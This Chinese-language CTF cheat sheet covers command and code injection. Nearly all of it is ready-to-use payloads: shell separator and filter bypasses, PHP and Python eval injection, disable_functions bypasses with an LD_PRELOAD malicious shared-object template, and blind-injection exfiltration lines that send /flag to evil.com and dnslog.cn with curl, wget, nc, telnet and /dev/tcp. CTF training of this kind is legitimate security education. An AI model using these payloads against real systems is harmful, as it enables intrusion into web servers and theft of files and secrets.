# 命令注入与代码注入

## 1. 概述
命令注入和代码注入是Web安全中最直接的攻击方式。命令注入指将操作系统命令注入到应用程序的命令执行函数中；代码注入指将脚本代码（通常PHP/JavaScript/Python）注入到eval等代码执行函数中。CTF中这两类漏洞常与WAF绕过、disable_functions绕过配合，构成最直接获取flag的路径。

**核心区别：**
- **命令注入**：操作OS层面（`system()`, `exec()`, `shell_exec()`, `popen()`, 反引号`` ` ``）
- **代码注入**：操作应用语言层面（PHP `eval()`/`assert()`/`create_function()`, Python `eval()`/`exec()`, JS `eval()`/`Function()`）

## 2. 核心原理

```php
// 命令注入漏洞
$ip = $_GET['ip'];
system("ping -c 4 " . $ip);   // 拼接用户输入到命令中
// Payload: ?ip=127.0.0.1;cat /flag

// 代码注入漏洞
$code = $_GET['code'];
eval("echo " . $code . ";");  // 拼接用户输入到代码中
// Payload: ?code=1;system('cat /flag');
```

## 3. 关键技巧与Payload

### 3.1 命令分隔符

**Linux环境：**
```bash
# 命令分隔符（先后执行）
; cmd2        # 无条件的先后执行
&& cmd2       # cmd1成功(exit 0)后执行cmd2
|| cmd2       # cmd1失败后执行cmd2
| cmd2        # 管道
& cmd2        # 后台执行

# 换行绕过
%0a cmd2      # URL中的换行
%0d%0a cmd2   # CRLF

# 命令替换（更隐蔽）
`cmd`         # 反引号
$(cmd)        # 美元括号
```

**Windows环境：**
```cmd
; cmd2
&& cmd2
|| cmd2
| cmd2
%0a cmd2
& cmd2        # Windows特有（不同于Linux的&）
%0d%0a cmd2
```

### 3.2 空格过滤绕过

```bash
# BASH空格替代（部分在sh中无效）
${IFS}    # 内部字段分隔符
$IFS$1    # 加$1分隔
${IFS}$1
<$IFS>
%09       # URL中的tab
%0a       # 换行
{cat,/flag}         # BASH brace expansion
X=$'\x20cat\x20/flag'&&$X  # 16进制构造

# 通用方法
cat</flag           # 输入重定向
cat<>/flag          # 输入重定向
<flag               # 读取文件（配合其他命令用）

# 例子
cat${IFS}/flag
cat$IFS/flag
cat$IFS$9/flag
cat</flag
URL: /?url=1;cat${IFS}/flag
/?url=1;cat%0934/flag
```

### 3.3 关键词过滤绕过

**命令本身被过滤：**
```bash
# cat 过滤
more /flag
less /flag
head /flag
tail -n 100 /flag
nl /flag
od -a /flag
rev /flag | rev       # 先反转，再反转回来
xxd /flag | xxd -r
strings /flag
tac /flag             # cat的反向（行倒序）
sort /flag
uniq /flag
awk '{print}' /flag
sed -n '1,$p' /flag
dd if=/flag

# cat 的其它替代
\cat /flag            # BASH反斜线忽略（某些场景）
/bin/c?t /flag        # 通配符
/bin/cat /etc/passwd
```

**常见关键字绕过技巧：**
```bash
# 通配符
cat /fl?g
cat /f??g
cat /flag*
/bin/c?t /flag

# 引号拆分（BASH忽略引号内的引号）
ca""t /flag
c'a't /flag
c\a\t /flag

# 变量拼接
a=c;b=at;c=/flag;$a$b $c

# 环境变量
echo $PATH
${PATH:0:1}            # 取PATH第一个字符

# 十六进制/八进制编码
echo -e "\x63\x61\x74 /flag" | bash
printf '\143\141\164\40\57\146\154\141\147' | sh

# base64编码
echo 'Y2F0IC9mbGFn' | base64 -d | bash
`echo "Y2F0IC9mbGFn" | base64 -d`
```

**flag关键词被过滤：**
```bash
# 通配符
cat /f???
cat /f*

# 正则匹配
cat /fla[g-z]
cat /fla[a-z]

# 环境变量读取
cat \$HOME/../flag

# 变量拼接
a=fla;b=g;cat /$a$b
```

### 3.4 无回显命令注入 (Blind Command Injection)

**诊断方法：**
```bash
# sleep时间判断
?ip=127.0.0.1;sleep+5   # 延时5秒

# 写文件判断
?ip=127.0.0.1;echo+test>/tmp/test.txt
# 然后请求 /tmp/test.txt（需知道路径）

# ping外带（需要DNSlog）
?ip=127.0.0.1;ping+-c+1+\`cat+/flag\`.dnslog.cn
```

**DNS外带：**
```bash
# Linux
?cmd=;nslookup+`cat+/flag`.dnslog.cn
?cmd=;curl+dnslog.cn/\`cat+/flag\`
?cmd=;wget+--post-file=/flag+dnslog.cn
?cmd=;curl+-F+file=@/flag+dnslog.cn

# 逐字节DNS外带（数据太长时分段）
?cmd=;nslookup+\`cut+-c+1-30+/flag\`.dnslog.cn
```

**HTTP外带：**
```bash
# curl wget外带
?cmd=;curl+http://evil.com/?flag=`cat+/flag`
?cmd=;curl+-d+@/flag+http://evil.com/
?cmd=;wget+http://evil.com/\`cat+/flag\`
?cmd=;wget+--post-file=/flag+http://evil.com/
```

**管道外带：**
```bash
# /dev/tcp (bash特性)
?cmd=;cat+/flag+>+/dev/tcp/evil.com/8080

# nc外带
?cmd=;cat+/flag+|nc+evil.com+8080
?cmd=;nc+evil.com+8080+<+/flag

# telnet外带
?cmd=;telnet+evil.com+8080+<+/flag
```

**写文件回显（知道web目录时）：**
```bash
?cmd=;cat+/flag>+/var/www/html/flag.txt
# 访问 http://target.com/flag.txt
```

### 3.5 PHP代码注入与绕过

**eval() 绕过：**
```php
// eval被过滤
assert($_POST['x']);   // PHP5.x可用assert输入代码（PHP7+移除）

// 字符串动态调用
$_POST['func']($_POST['arg']);
// func=system&arg=cat /flag

// create_function (PHP < 7.2)
create_function('', 'system("cat /flag");');

// call_user_func / call_user_func_array
call_user_func('system', 'cat /flag');

// preg_replace /e (PHP < 7.0)
preg_replace('/./e', 'system("cat /flag")', 'a');

// array_map / array_filter / array_walk
array_map('system', ['cat /flag']);

// ob_start + 回调
ob_start('system');
echo 'cat /flag';

// include/require (远程包含或data://)
include('data://text/plain,<?php system("cat /flag");?>');
```

**PHP代码执行后缀绕过：**
```php
// 闭合前面的括号和引号
// 原始代码: eval("echo '$code';");
// Payload: 1';system('cat /flag');'

// 字符串连接
// Payload: '.system('cat /flag').'
```

### 3.6 Python代码注入

```python
# eval注入
eval(input)  # Python3 input() = Python2 raw_input()
# Payload: __import__('os').system('cat /flag')

# exec注入
exec('print(' + user_input + ')')
# Payload: 1);__import__('os').system('cat /flag');(
```

**Python绕过常见限制：**
```python
# import被过滤 → 用 __import__
__import__('os').system('cat /flag')

# 获取builtins
().__class__.__bases__[0].__subclasses__()...  # 类似SSTI链

# 字符限制绕过
().__class__.__bases__[0].__subclasses__()[...].__init__.__globals__['system']('cat /flag')
```

### 3.7 disable_functions突破（PHP）

**常用绕过方法速查表：**

| 方法 | 原理 | 条件 |
|------|------|------|
| LD_PRELOAD | `putenv()`+mail触发.so | putenv可用 |
| shellshock | `putenv(BASH_FUNC_xxx)` | 软件链接/bin/sh→bash |
| ImageMagick | delegate执行命令 | ImageMagick已安装 |
| Apache mod_cgi | CGI shell写入 | apache cgi-bin |
| PHP-FPM | Gopher/FastCGI直连 | PHP-FPM端口可达 |
| COM组件 | `new COM('WScript.Shell')` | Windows+PHP com_dotnet |
| FFI | `FFI::cdef()` 直接调C | PHP 7.4+ + ffi.enable |
| SQLite UDF | 加载恶意.so | sqlite扩展 |
| mail+readelf | 构造恶意.so传参 | 多参数传递控制 |
| iconv | `iconv_mime_decode_headers`+`iconv_set_encoding`| PHP 7.4+ 特定版本 |
| GC UAF | 内存漏洞利用 | 特定PHP版本(7.x) |

**LD_PRELOAD利用代码框架：**
```c
// evil.c
#include <stdlib.h>
#include <string.h>
__attribute__ ((__constructor__)) void angel(void) {
    unsetenv("LD_PRELOAD");
    system("cat /flag > /var/www/html/flag.txt");
}
// 编译：gcc -shared -fPIC evil.c -o evil.so
```
PHP利用：
```php
<?php
putenv("LD_PRELOAD=/var/www/html/evil.so");
mail("a","b","c","d");  // 触发sendmail调用
// 或用 error_log("",1)
?>
```

## 4. 常见误区与注意事项
1. **cmd与sh/bash语法不同**：`$()` 和 `>>` 是bash特性，不是所有shell支持。优先用`${IFS}`而非bash独有特性。
2. **管道符优先级**：`&&` 和 `||` 有短路逻辑，前命令失败可能导致后命令不执行；盲打用 `;` 或 `%0a` 更可靠。
3. **空格绕过不是全部给力**：`cat</flag`在复杂命令中可能不生效，建议多方法备选。
4. **disable_functions绕过需多管齐下**：LD_PRELOAD最经典但需`putenv()`可用；不能用时考虑PHP-FPM/ImageMagick/COM组件。
5. **无回显环境的数据量**：DNS外带有长度限制（约63字符/段），长数据需逐段外带；curl/wget POST更适合长数据。
6. **代码注入=系统权限**：PHP/Python的eval获得的是Web进程权限，不是root，需考虑文件读写权限。
7. **Windows与Linux命令差异**：`ipconfig` vs `ifconfig`, `type` vs `cat`, `dir` vs `ls`, `findstr` vs `grep`。
8. **offline策略**：本地保存LD_PRELOAD利用.so编译脚本；准备DNSlog平台（用VPS搭建简单dnslog）；prebuild curl/wget/nc/ping等外带payload。

## 5. 实战示例

### 示例1：命令注入 + 空格绕过 + DNS外带
```
场景：ping接口 `system("ping " . $ip)` 过滤空格和cat
```
Payload：
```bash
# 用${IFS}绕过空格
?ip=127.0.0.1%0acurl${IFS}dnslog.cn/`tac${IFS}/flag`

# 或用输入重定向绕过cat
?ip=127.0.0.1%0acurl${IFS}dnslog.cn/\`</flag\`
```

### 示例2：PHP eval() + disable_functions bypass
```
场景：PHP 7.3 eval执行代码但disable_functions禁了system/exec等
```
Payload：
```php
// 步骤1：确认disable_functions列表
eval("phpinfo();");

// 步骤2：如果putenv可用，上传LD_PRELOAD+mail触发
putenv("LD_PRELOAD=/tmp/evil.so");
mail("","","","");
// 需要提前将evil.so写入/tmp（利用file_put_contents+base64）

// 步骤3：如果putenv被禁，尝试PHP-FPM利用
// 用file_get_contents curl gopher://127.0.0.1:9000 + FastCGI payload
```
